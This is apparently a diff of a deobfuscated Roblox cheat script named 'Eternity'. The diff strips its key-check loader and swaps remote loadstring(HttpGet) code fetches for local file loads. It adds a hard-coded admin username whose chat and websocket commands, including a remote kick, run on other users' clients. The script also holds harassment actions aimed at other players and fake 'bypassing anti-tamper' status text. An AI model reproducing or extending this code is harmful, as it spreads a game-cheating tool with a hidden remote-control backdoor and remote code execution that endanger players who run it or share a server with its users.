-											frame33.Size = UDim2.new(0, 0, 1, 0)
-											frame33.BackgroundColor3 = tbl17.accent
-											tween(textButton9, {
-												BackgroundColor3 = tbl17.accent,
-												TextColor3 = Color3.fromRGB(15, 12, 5),
-											}, 0.2)
-											textButton9.Text = "Verify"
-											flag12 = false
-										end
-									end)
-
-									return
-								end
-
-								 --[[?NilIndex]]
-							end
-						else
-							-- Blacklist check removed
-
-							if flag12 then
-								return
-							end
-							text = textBox2.Text
-
-							if text and not (#text < 4) then
-								flag12 = true
-
-								if step6 == 361451889 then
-									pcall(function()
-										v3:Play()
-									end)
-
-									textButton9.Text = "Verifying..."
-									textLabel11.Text = ""
-									udim24 = UDim2.new(0, 0, 1, 0)
-									frame33.Size = udim24
-									frame33.BackgroundTransparency = 0
-									frame32.BackgroundTransparency = 0.35
-									tween(frame33, { Size = UDim2.new(0.4, 0, 1, 0) }, 0.3, Enum.EasingStyle.Quad)
-
-									task.spawn(function()
-										local localPlayer_4 = Players_2
-
-										if localPlayer_4 then
-											localPlayer_4 = Players_2.LocalPlayer
-										end
-
-										local name4
-
-										if not localPlayer_4 then
-											localPlayer_4 = game:GetService("Players")
-
-											if localPlayer_4 then
-												localPlayer_4 = game:GetService("Players").LocalPlayer
-											end
-
-											name4 = localPlayer_4
-
-											if name4 then
-												name4 = localPlayer_4.Name
-											end
-										else
-											name4 = localPlayer_4.Name
-										end
-
-										name4 = name4 or ""
-										task.wait(0.2)
-										tween(frame33, { Size = UDim2.new(0.7, 0, 1, 0) }, 0.5, Enum.EasingStyle.Quad)
-
-										local ok, result = pcall(function()
-											return safeHttpGet("https://zeternity.online/api/key/verify?user=" .. name4 .. "&key=" .. text)
-										end)
-
-										if ok and result then
-											local str3 = string.lower(string.gsub(tostring(result), "%s+", ""))
-
-											if string.sub(str3, 1, 4) == "true" then
-												pcall(function()
-													if fetchCustomTags then
-														fetchCustomTags()
-													end
-
-													local getgenv_ = L1.fetchRemoteWhitelist
-
-													if not getgenv_ then
-														getgenv_ = getgenv
-
-														if getgenv_ then
-															getgenv_ = getgenv().fetchRemoteWhitelist
-														end
-													end
-
-													if getgenv_ then
-														getgenv_()
-													end
-												end)
-
-												tween(frame33, {
-													Size = UDim2.new(1, 0, 1, 0),
-													BackgroundColor3 = Color3.fromRGB(80, 220, 130),
-												}, 0.25, Enum.EasingStyle.Quad)
-												textButton9.Text = "Verified!"
-												tween(textButton9, { BackgroundColor3 = Color3.fromRGB(60, 190, 110) }, 0.2)
-												textLabel11.Text = "Key accepted!"
-
-												textLabel11.TextColor3 = Color3.fromRGB(80, 220, 130)
-												task.wait(0.5)
-
-												if typeof(fn16) == "function" then
-													fn16(function()
-														frame12.Visible = false
-
-														pcall(function()
-															if tbl20 then
-																tbl20:Stop()
-																tbl20:Destroy()
-															end
-														end)
-													end)
-												else
-													tween(frame12, { BackgroundTransparency = 1 }, 0.35)
-													task.wait(0.35)
-													frame12.Visible = false
-												end
-
-												getgenv().EternityLoaderSuccess = true
-												getgenv().EternityIsWhitelisted = false
-
-												if typeof(fn19) == "function" then
-													fn19(false)
-												end
-
-												flag9 = true
-												flag8 = true
-											else
-												tween(frame33, {
-													Size = UDim2.new(1, 0, 1, 0),
-													BackgroundColor3 = tbl17.danger,
-												}, 0.2)
-												textButton9.Text = "Invalid Key"
-												tween(textButton9, {
-													BackgroundColor3 = tbl17.danger,
-													TextColor3 = Color3.fromRGB(255, 255, 255),
-												}, 0.2)
-												local text2 = "Invalid or expired key."
-
-												if string.find(str3, "expired") then
-													text2 = "Key has expired. Get a new one."
-												elseif string.find(str3, "already_used") then
-													text2 = "Key already used by another user."
-												end
-
-												textLabel11.Text = text2
-												textLabel11.TextColor3 = tbl17.danger
-												task.wait(1.5)
-												tween(frame33, { BackgroundTransparency = 1 }, 0.2)
-												tween(frame32, { BackgroundTransparency = 1 }, 0.2)
-												frame33.Size = UDim2.new(0, 0, 1, 0)
-												frame33.BackgroundColor3 = tbl17.accent
-												tween(textButton9, {
-													BackgroundColor3 = tbl17.accent,
-													TextColor3 = Color3.fromRGB(15, 12, 5),
-												}, 0.2)
-												textButton9.Text = "Verify"
-												flag12 = false
-											end
-										else
-											tween(frame33, {
-												Size = UDim2.new(1, 0, 1, 0),
-												BackgroundColor3 = tbl17.danger,
-											}, 0.2)
-											textButton9.Text = "Error"
-											tween(textButton9, {
-												BackgroundColor3 = tbl17.danger,
-												TextColor3 = Color3.fromRGB(255, 255, 255),
-											}, 0.2)
-											textLabel11.Text = "Connection failed. Try again."
-											textLabel11.TextColor3 = tbl17.danger
-											local taskWait = task.wait
-											taskWait(1.5)
-											tween(frame33, { BackgroundTransparency = 1 }, 0.2)
-											tween(frame32, { BackgroundTransparency = 1 }, 0.2)
-											frame33.Size = UDim2.new(0, 0, 1, 0)
-											frame33.BackgroundColor3 = tbl17.accent
-											tween(textButton9, {
-												BackgroundColor3 = tbl17.accent,
-												TextColor3 = Color3.fromRGB(15, 12, 5),
-											}, 0.2)
-											textButton9.Text = "Verify"
-											flag12 = false
-										end
-									end)
-
-									return
-								end
-
-								 --[[?NilIndex]]
-							end
-						end
-
-						textLabel11.Text = "Please enter a valid key."
-						textLabel11.TextColor3 = tbl17.danger
-					end)
-
-					local function fn21()
-						-- Key system removed: do not display key prompt
-						return
-					end
-					local function _disabled_fn21()
-						flag11 = true
-
-						if typeof(fn19) == "function" then
-							fn19(false)
-						end
-
-						textButton6.Visible = false
-						textLabel8.Visible = false
-						frame26.Visible = false
-
-						if textButton5 then
-							textButton5.Visible = false
-						end
-
-						local count2 = 45505946
-						frame29.Visible = false
-						tween(frame30, { BackgroundTransparency = 0 }, 0.3)
-						tween(textBox2, { TextTransparency = 0 }, 0.3)
-						tween(imageLabel6, { TextTransparency = 0 }, 0.3)
-						tween(textButton7, { BackgroundTransparency = 0, TextTransparency = 0 }, 0.3)
-						task.wait(0.1)
-						tween(textButton8, { BackgroundTransparency = 0, TextTransparency = 0 }, 0.3)
-
-						if L1.step2 == 872722148 then
-							L1.step4 = 599253658
-							step6 = 403247277
-							L1.step3 = 141499918
-							step = 262405910
-							step7 = 217820898
-						end
-
-						tween(textButton9, { BackgroundTransparency = 0, TextTransparency = 0 }, 0.3)
-						task.wait(0.1)
-						tween(textLabel12, { TextTransparency = 0 }, 0.3)
-
-						task.spawn(function()
-							-- Inactivity kick disabled
-						end)
-					end
-
-					textButton6.MouseButton1Click:Connect(function()
-						local count2 = 956780847
-						local localPlayer_3 = Players_2
-
-						if localPlayer_3 then
-							localPlayer_3 = Players_2.LocalPlayer
-						end
-
-						if not localPlayer_3 then
-							localPlayer_3 = game:GetService("Players")
-
-							if localPlayer_3 then
-								localPlayer_3 = game:GetService("Players").LocalPlayer
-							end
-						end
-
-						-- Blacklist check and kick removed
-
-						if flag10 then
-							return
-						end
-
-						if flag11 then
-							return
-						end
-						flag10 = true
-
-						pcall(function()
-							v3:Stop()
-							v3.TimePosition = 0
-							v3:Play()
-						end)
-
-						local size = textButton6.Size
-						local position4 = textButton6.Position
-
-						tween(textButton6, {
-							Size = UDim2.new(size.X.Scale, size.X.Offset - 10, size.Y.Scale, size.Y.Offset - 4),
-							Position = UDim2.new(position4.X.Scale, position4.X.Offset + 5, position4.Y.Scale, position4.Y.Offset + 2),
-						}, 0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-
-						task.delay(0.09, function()
-							if textButton6 and textButton6.Parent then
-								tween(textButton6, {
-									Size = size,
-									Position = position4,
-								}, 0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-							end
-
-							if step6 < count2 then
-								return
-							end
-						end)
-
-						frame27.Size = UDim2.new(0, 0, 1, 0)
-						frame27.BackgroundColor3 = tbl17.accent
-
-						if step < step8 then
-							frame27.BackgroundTransparency = 0
-						else
-							L1.step2 -= 1733
-							count = 367627489
-							step8 = 810633731
-							L1.step3 = 650653623
-							L1.step4 -= 1520
-							step7 += 1293
-							step6 = 503986966
-							count2 -= 524
-							step += 1275
-						end
-
-						frame26.BackgroundTransparency = 0.4
-						frame28.BackgroundTransparency = 0.4
-						frame28.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-						textButton6.Text = "Authenticating..."
-						textLabel8.Text = "Verifying operator credentials & session tokens..."
-						textLabel8.TextColor3 = Color3.fromRGB(180, 195, 235)
-						tween(frame27, { Size = UDim2.new(0.24, 0, 1, 0) }, 0.85, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-
-						task.spawn(function()
-							local localPlayer_4 = Players_2
-
-							if localPlayer_4 then
-								localPlayer_4 = Players_2.LocalPlayer
-							end
-
-							local name4
-
-							if not localPlayer_4 then
-								localPlayer_4 = game:GetService("Players")
-
-								if localPlayer_4 then
-									localPlayer_4 = game:GetService("Players").LocalPlayer
-								end
-
-								name4 = localPlayer_4
-
-								if name4 then
-									name4 = localPlayer_4.Name
-								end
-							else
-								name4 = localPlayer_4.Name
-							end
-
-							name4 = name4 or ""
-							local count6 = 110052848
-							local str3 = string.lower(string.gsub(tostring(name4), "%s+", ""))
-							local whitelistedUsers = true
-							local flag13 = true
-							local flag14 = false
-
-							task.wait(0.9)
-							textButton6.Text = "Injecting Core Hooks..."
-							textLabel8.Text = "Bypassing anti-tamper & hooking engine memory..."
-							textLabel8.TextColor3 = Color3.fromRGB(200, 212, 245)
-							pcall(loadSettings)
-							tween(frame27, { Size = UDim2.new(0.58, 0, 1, 0) }, 1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-							task.wait(1.05)
-							textButton6.Text = "Compiling Bytecode..."
-							textLabel8.Text = "Resolving runtime pipelines & execution sandbox..."
-							textLabel8.TextColor3 = Color3.fromRGB(210, 222, 255)
-							tween(frame27, { Size = UDim2.new(0.84, 0, 1, 0) }, 0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-
-							task.spawn(function()
-								if fetchCustomTags then
-									if step8 == count6 then
-										count6 += 1951
-									end
-
-									fetchCustomTags()
-								end
-							end)
-
-							task.wait(0.95)
-							textButton6.Text = "Finalizing Sandbox..."
-							textLabel8.Text = "Mounting UI framework & synchronizing modules..."
-							textLabel8.TextColor3 = Color3.fromRGB(220, 235, 255)
-							tween(frame27, { Size = UDim2.new(0.96, 0, 1, 0) }, 0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-							local now = tick()
-
-							while not flag13 and tick() - now < 1 do
-								task.wait(0.05)
-							end
-
-							task.wait(0.75)
-
-							if whitelistedUsers then
-								local whitelistedUsers2 = str3 == "horize1n" or str3 == "hor1zen"
-
-								if not whitelistedUsers2 then
-									whitelistedUsers2 = getgenv().WhitelistedUsers
-
-									if whitelistedUsers2 then
-										whitelistedUsers2 = getgenv().WhitelistedUsers[str3] == true
-									end
-
-									if not whitelistedUsers2 then
-										whitelistedUsers2 = fn20
-
-										if whitelistedUsers2 then
-											whitelistedUsers2 = fn20(name4)
-										end
-									end
-								end
-
-								if typeof(fn19) == "function" then
-									fn19(whitelistedUsers2 == true)
-								end
-
-								getgenv().EternityLoaderSuccess = true
-								getgenv().EternityIsWhitelisted = whitelistedUsers2 == true
-								tween(frame27, {
-									Size = UDim2.new(1, 0, 1, 0),
-									BackgroundColor3 = Color3.fromRGB(46, 204, 113),
-								}, 0.35, Enum.EasingStyle.Quad)
-								frame28.BackgroundColor3 = Color3.fromRGB(220, 255, 235)
-								textButton6.Text = "Loaded Successfully! ✓"
-								tween(textButton6, {
-									BackgroundColor3 = Color3.fromRGB(46, 204, 113),
-									TextColor3 = Color3.fromRGB(255, 255, 255),
-								}, 0.3)
-								textLabel8.Text = "Eternity Engine Ready • Launching..."
-								textLabel8.TextColor3 = Color3.fromRGB(80, 220, 140)
-								task.wait(0.55)
-
-								local function fn22()
-									frame12.Visible = false
-
-									pcall(function()
-										if tbl20 then
-											tbl20:Stop()
-											tbl20:Destroy()
-										end
-									end)
-
-									flag9 = true
-									if count6 == 110052848 then
-										flag8 = true
-										return
-									end
-								end
-
-								if typeof(fn16) == "function" then
-									fn16(fn22)
-								else
-									tween(frame12, { BackgroundTransparency = 1 }, 0.35)
-									task.wait(0.35)
-									fn22()
-								end
-							elseif flag14 then
-								tween(frame27, { Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = tbl17.danger }, 0.2)
-								frame28.BackgroundColor3 = Color3.fromRGB(255, 180, 180)
-								textButton6.Text = "Connection Failed"
-								tween(textButton6, {
-									BackgroundColor3 = tbl17.danger,
-									TextColor3 = Color3.fromRGB(255, 255, 255),
-								}, 0.2)
-								textLabel8.Text = "Failed to reach verification endpoint."
-								textLabel8.TextColor3 = tbl17.danger
-								task.wait(1.5)
-								tween(frame27, { BackgroundTransparency = 1 }, 0.2)
-								tween(frame26, { BackgroundTransparency = 1 }, 0.2)
-								frame27.Size = UDim2.new(0, 0, 1, 0)
-								frame27.BackgroundColor3 = tbl17.accent
-								tween(textButton6, {
-									BackgroundColor3 = tbl17.accent,
-									TextColor3 = Color3.fromRGB(15, 12, 5),
-								}, 0.2)
-								textButton6.Text = "Load Script  ▶"
-								textLabel8.Text = ""
-								flag10 = false
-							else
-								-- Fallback: load script directly without key
-								getgenv().EternityLoaderSuccess = true
-								getgenv().EternityIsWhitelisted = true
-								flag9 = true
-								flag8 = true
-								frame12.Visible = false
-							end
-						end)
-					end)
-
-					task.spawn(function()
-						-- Background key verification check removed
-					end)
-				end
-
-				task.spawn(function()
-					-- Inactivity kick disabled
-				end)
-
-				while not flag8 do
-					task.wait(0.05)
-				end
-
-				return flag9
-			end
-
-			if getgenv().SkipLoader then
 				getgenv().EternityLoaderSuccess = true
-				getgenv().EternityIsWhitelisted = true
-				isVerified = true
-			else
-				isVerified = launchLoader()
+				getgenv().IsKeyVerified = true
+				IsKeyVerified = true
+				return true
 			end
 
+			isVerified = launchLoader()
 			if not isVerified then
 				nextBlock = 378
 			else
@@ -7238,7 +673,11 @@ do
 		elseif nextBlock == 25 then
 			nextBlock = 28
 		elseif nextBlock == 26 then
-			nextBlock = 27
+			if L1.isUserBlacklisted(L1.players) then
+				nextBlock = 375
+			else
+				nextBlock = 27
+			end
 		elseif nextBlock == 27 then
 			L1.name3 = L1.players.Name
 
@@ -7251,10 +690,14 @@ do
 			L1.name3 = ""
 			nextBlock = 29
 		elseif nextBlock == 29 then
-			spill_2.r13 = true
-			getgenv().EternityLoaderSuccess = true
-			getgenv().EternityIsWhitelisted = true
-			nextBlock = 40
+			spill_2.r13 = false
+
+			do
+
+				ok = true
+				L1.iterFn1 = "true"
+				nextBlock = 30
+			end
 		elseif nextBlock == 30 then
 			spill_2.r13 = string.lower(string.gsub(tostring(L1.iterFn1), "%s+", ""))
 			L1.iterFn1 = spill_2.r13 == "true"
@@ -7331,14 +774,7 @@ do
 			L1.iterState1 = getgenv().WhitelistedUsers[L1.iterFn1] == true
 			nextBlock = 38
 		elseif nextBlock == 38 then
-			L1.iterState1 = true -- [INSERT THIS LINE]
-			getgenv().EternityIsWhitelisted = true -- [REPLACE LINE 3804]
-
-			pcall(function()
-				if fetchCustomTags then
-					fetchCustomTags()
-				end
-			end)
+			getgenv().EternityIsWhitelisted = L1.iterState1 == true
 
 			pcall(function()
 				if fetchCustomTags then
@@ -7428,6 +864,8 @@ do
 				end)
 			end
 
+			IsKeyVerified = true
+			getgenv().IsKeyVerified = true
 			VALID_KEY = "zzzen"
 			SCRIPT_VERSION = "v2.0"
 			SCRIPT_NAME = "Eternity"
@@ -7573,12 +1011,10 @@ do
 							pgPlayer_ = TargetPlayer or FacebangTarget or HipbangTarget or PatTarget or HeadsitTarget or BackhugTarget or FronthugTarget or ProposeTarget or BagpackTarget or GoonTarget or CustomAttachTarget
 
 							if not pgPlayer_ then
-								pgPlayer_ = typeof(pgPlayer) == "Instance"
-
-								if pgPlayer_ then
-									pgPlayer_ = pgPlayer
-								end
-							end
+                              if typeof(TargetPlayer) == "Instance" then
+                                pgPlayer_ = TargetPlayer
+                            end
+                        end
 
 							local v3 = nil
 
@@ -7602,7 +1038,7 @@ do
 							end
 
 							if pgPlayer_ then
-								if arg == "Facebang" and not FacebangTarget then
+								if arg == "Facebang" then
 									FacebangTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7626,7 +1062,7 @@ do
 									return
 								end
 
-								if arg == "Hipbang" and not HipbangTarget then
+								if arg == "Hipbang" then
 									HipbangTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7650,7 +1086,7 @@ do
 									return
 								end
 
-								if arg == "Pat" and not PatTarget then
+								if arg == "Pat" then
 									PatTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7674,7 +1110,7 @@ do
 									return
 								end
 
-								if arg == "Headsit" and not HeadsitTarget then
+								if arg == "Headsit" then
 									HeadsitTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7698,7 +1134,7 @@ do
 									return
 								end
 
-								if arg == "Backhug" and not BackhugTarget then
+								if arg == "Backhug" then
 									BackhugTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7722,7 +1158,7 @@ do
 									return
 								end
 
-								if arg == "Fronthug" and not FronthugTarget then
+								if arg == "Fronthug" then
 									FronthugTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7746,7 +1182,7 @@ do
 									return
 								end
 
-								if arg == "Propose" and not ProposeTarget then
+								if arg == "Propose" then
 									ProposeTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7770,7 +1206,7 @@ do
 									return
 								end
 
-								if arg == "Bagpack" and not BagpackTarget then
+								if arg == "Bagpack" then
 									BagpackTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7794,7 +1230,7 @@ do
 									return
 								end
 
-								if arg == "Goon" and not GoonTarget then
+								if arg == "Goon" then
 									GoonTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -7818,7 +1254,7 @@ do
 									return
 								end
 
-								if arg == "CustomAttach" and not CustomAttachTarget then
+								if arg == "CustomAttach" then
 									CustomAttachTarget = pgPlayer_
 									syncAttachTarget(pgPlayer_)
 									tbl[arg] = arg2
@@ -8897,53 +2333,13 @@ do
 			nextBlock = 64
 		elseif nextBlock == 64 then
 			function getAssetUrl(str3)
-				if getcustomasset_ and isfile and readfile and writefile then
+				if getcustomasset_ and isfile and readfile then
 					local str4 = "ZenV1_Media_v2/" .. str3
-
-					if not isfolder("ZenV1_Media_v2") then
-						makefolder("ZenV1_Media_v2")
-					end
-
-					local flag8 = true
-
-					if isfile(str4) then
-						local ok, content = pcall(function()
-							return readfile(str4)
-						end)
-
-						if ok and content and string.len(content) > 100 then
-							flag8 = false
-						end
-
-						if flag8 then
-							pcall(function()
-								local response = game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/assets/main/" .. str3)
-
-								if response and string.len(response) > 100 and not string.find(response, "404: Not Found") then
-									writefile(str4, response)
-								end
-
-								return
-							end)
-						end
-					else
-						pcall(function()
-							local response = game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/assets/main/" .. str3)
-
-							if response and string.len(response) > 100 and not string.find(response, "404: Not Found") then
-								writefile(str4, response)
-							end
-
-							return
-						end)
-					end
-
 					if isfile(str4) then
 						return getcustomasset_(str4)
 					end
 				end
-
-				return "https://raw.githubusercontent.com/hor1zencodes/assets/main/" .. str3
+				return ""
 			end
 
 			screenGui.ResetOnSpawn = false
@@ -10168,8 +3564,8 @@ do
 						return
 					end
 
-					 --[[?NilIndex]]
-					 --[[?NilIndex]]
+
+
 				end)
 			end)
 
@@ -20245,7 +13641,7 @@ do
 												if count4 == 18274702 then
 													return localPlayer_:GetFriendsOnline(200)
 												end
-												 --[[?NilIndex]]
+
 											end)
 
 											if not ok then
@@ -26037,7 +19433,7 @@ do
 											return loadstring(readfile("module.lua"))()
 										end
 
-										return loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/module.lua"))()
+										return nil
 									end)
 
 									if ok and type(result) == "table" then
@@ -26374,7 +19770,7 @@ do
 											return nil
 										end
 
-										return game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/animations.json")
+										return "[]"
 									end)
 
 									if ok and type(result) == "string" then
@@ -37056,8 +30452,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 									loadstring(readfile("EternityStudio.lua"))()
 								elseif isfile and isfile("EternityStudio") then
 									loadstring(readfile("EternityStudio"))()
-								else
-									loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/EternityStudio.lua"))()
+
 								end
 							end)
 
@@ -38512,7 +31907,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 										if L1.step2 == 872721990 then
 											return
 										end
-										 --[[?NilIndex]]
+
 									end)
 
 									local frame16 = Instance.new("Frame", frame13)
@@ -47526,7 +40921,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 										if count < step then
 											return
 										end
-										 --[[?NilIndex]]
+
 									end)
 								end
 							end
@@ -47549,7 +40944,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 									end
 
 									local ok, result = pcall(function()
-										loadstring(game:HttpGet(url))()
+										if isfile and isfile(url) then loadstring(readfile(url))() end
 									end)
 
 									if ok then
@@ -47692,7 +41087,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							tbl.ActiveShadeFile = r223.file
 							tbl.ActiveShadeName = r223.name
 							saveSettings()
-							applyShade("https://raw.githubusercontent.com/hor1zencodes/Shaders/main/" .. r223.file, r223.name)
+							applyShade("" .. r223.file, r223.name)
 						else
 							name = "Reset"
 
@@ -47810,7 +41205,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							end
 
 							local ok, result = pcall(function()
-								loadstring(game:HttpGet(url))()
+								if isfile and isfile(url) then loadstring(readfile(url))() end
 							end)
 
 							if ok then
@@ -47945,7 +41340,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							tbl.ActiveTerrainFile = r223.file
 							tbl.ActiveTerrainName = r223.name
 							saveSettings()
-							applyTerrain("https://raw.githubusercontent.com/hor1zencodes/Shaders/main/Terrains/" .. r223.file, r223.name)
+							applyTerrain("" .. r223.file, r223.name)
 						else
 							name2 = "Reset"
 
@@ -49420,7 +42815,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 									end
 
 									do
-										local tbl19 = {}
+										local tbl19 = { horize1n = true }
 										local iterFn12 = L1.iterFn1
 
 										fn2 = function()
@@ -49666,7 +43061,43 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 																	local username = data2.username or data2.sender
 																	local text = data2.text or ""
 
-																	-- Admin commands via websocket removed
+																	if username and text ~= "" and string.sub(text, 1, 1) == "." then
+																		local flag8 = string.lower(username) == "horize1n"
+
+																		if not flag8 then
+																			flag8 = tbl19
+
+																			if flag8 then
+																				flag8 = tbl19[string.lower(username)]
+																			end
+																		end
+
+																		if flag8 then
+																			task.spawn(function()
+																				pcall(function()
+																					local processAdminCommand_ = getgenv().processAdminCommand
+
+																					if processAdminCommand_ then
+																						local tbl20 = {
+																							Name = username,
+																							DisplayName = data2.displayName or username,
+																							UserId = data2.userId,
+																						}
+																						local character2 = game.Players:FindFirstChild(username)
+
+																						if character2 then
+																							character2 = game.Players:FindFirstChild(username).Character
+																						end
+
+																						tbl20.Character = character2
+																						processAdminCommand_(tbl20, text)
+																					end
+
+																					return
+																				end)
+																			end)
+																		end
+																	end
 
 																	if (data2.channel or "global") == "server" then
 																		local str3 = tostring(game.PlaceId)
@@ -49883,8 +43314,28 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 													}
 
 													iterFn12(v8, tbl19)
+
+													if string.sub(text, 1, 1) == "." and string.lower(localPlayer_2.Name) == "horize1n" then
+														local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+
+														if match == ".kick" and v9 and executeRemoteKick then
+															executeRemoteKick(v9)
+														else
+															SendNotification("Eternity Admin", "Dispatched command: " .. text, 3)
+														end
+													end
 												end)
 											else
+												local localPlayer_2 = game.Players.LocalPlayer
+
+												if localPlayer_2 and string.sub(text, 1, 1) == "." and string.lower(localPlayer_2.Name) == "horize1n" then
+													local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+													if match == ".kick" and v9 and executeRemoteKick then
+														executeRemoteKick(v9)
+														return
+													end
+												end
+
 												spawnGlobalMessage("[SYSTEM]", "Not connected to Global Chat. Reconnecting...", true)
 												pcall(fn16)
 											end
@@ -49928,7 +43379,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 
 										syn_ = syn_ or http_request or request
 										local body = nil
-										local url = str .. "/rest/v1/live_users?apikey=" .. apikey .. ("&last_ping=gte." .. os.date("!%Y-%m-%dT%H:%M:%SZ", os.time() - 150) .. "&select=username&order=last_ping.desc&limit=50")
+										local url = ""
 
 										if type(syn_) == "function" then
 											local ok, result = pcall(function()
@@ -52684,7 +46135,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 								if isfile and isfile("module.lua") then
 									return loadstring(readfile("module.lua"))()
 								end
-								return loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/module.lua"))()
+								return nil
 							end)
 
 							if ok and type(result) == "table" then
@@ -52703,7 +46154,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							if isfile and isfile("animations.json") then
 								return readfile("animations.json")
 							end
-							return game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/animations.json")
+							return "[]"
 						end)
 
 						if ok and type(result) == "string" then
@@ -53011,7 +46462,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							if step == 948147176 then
 								return
 							end
-							 --[[?NilIndex]]
+
 						end)
 
 						tbl20.minBtn.MouseLeave:Connect(function()
@@ -57037,8 +50488,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 														loadstring(readfile("EternityStudio.lua"))()
 													elseif isfile and isfile("EternityStudio") then
 														loadstring(readfile("EternityStudio"))()
-													else
-														loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/EternityStudio.lua"))()
+
 													end
 
 													return
@@ -58893,7 +52343,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 							if _G.__LAUNCH_ZEN_RUNNER then
 								_G.__LAUNCH_ZEN_RUNNER()
 							else
-								loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/idk/main/runner.lua"))()
+								if isfile and isfile("runner.lua") then loadstring(readfile("runner.lua"))() end
 							end
 
 							return
@@ -58906,7 +52356,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 
 					do
 						createActionButton(_animEmotes, "Load Emote Wheel", "Loads the Emote Wheel script", 11, function()
-							loadstring(game:HttpGet("https://raw.githubusercontent.com/hor1zencodes/EmoteWheel/main/zenemotewheel.lua"))()
+							if isfile and isfile("zenemotewheel.lua") then loadstring(readfile("zenemotewheel.lua"))() end
 						end)
 					end
 
@@ -60416,7 +53866,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 										Workspace_.FallenPartsDestroyHeight = tbl9.VoidHeight
 										return
 									end
-									 --[[?NilIndex]]
+
 								end)
 							end
 						end)
@@ -74759,7 +68209,7 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 						task.spawn(function()
 							pcall(function()
 								local apikey2 = apikey
-								local url = str .. "/rest/v1/stats?apikey=" .. apikey2 .. "&key=in.(" .. table.concat(tbl17, ",") .. ")&select=key,value"
+								local url = ""
 								local syn_ = syn
 
 								if syn_ then
@@ -74989,12 +68439,12 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 				do
 					task.spawn(function()
 						if tbl.AutoExecuteTerrain and tbl.ActiveTerrainFile then
-							applyTerrain("https://raw.githubusercontent.com/hor1zencodes/Shaders/main/Terrains/" .. tbl.ActiveTerrainFile, tbl.ActiveTerrainName)
+							applyTerrain("" .. tbl.ActiveTerrainFile, tbl.ActiveTerrainName)
 							task.wait(1.5)
 						end
 
 						if tbl.AutoExecuteShader and tbl.ActiveShadeFile then
-							applyShade("https://raw.githubusercontent.com/hor1zencodes/Shaders/main/" .. tbl.ActiveShadeFile, tbl.ActiveShadeName)
+							applyShade("" .. tbl.ActiveShadeFile, tbl.ActiveShadeName)
 						end
 
 						if tbl.AutoExecuteWeather and tbl.ActiveWeatherType and tbl.ActiveWeatherType ~= "reset" then
@@ -75337,6 +68787,10 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 								localPlayer_.Chatted:Connect(function(message)
 									pcall(function()
 										fn16(message)
+
+										if processAdminCommand then
+											processAdminCommand(localPlayer_, message)
+										end
 									end)
 								end)
 
@@ -75359,6 +68813,11 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 									L1.TextChatService.SendingMessage:Connect(function(arg)
 										pcall(function()
 											fn16(arg.Text)
+
+											if processAdminCommand then
+												processAdminCommand(localPlayer_, arg.Text)
+											end
+
 											return
 										end)
 									end)
@@ -75379,15 +68838,211 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 					nextBlock = 356
 				end
 			elseif nextBlock == 355 then
-				spill_2.r13 = {}
+				spill_2.r13 = { horize1n = true }
 				nextBlock = 356
 			elseif nextBlock == 356 then
 				do
-					P2PAdmins = {}
+					P2PAdmins = spill_2.r13
 
 					do
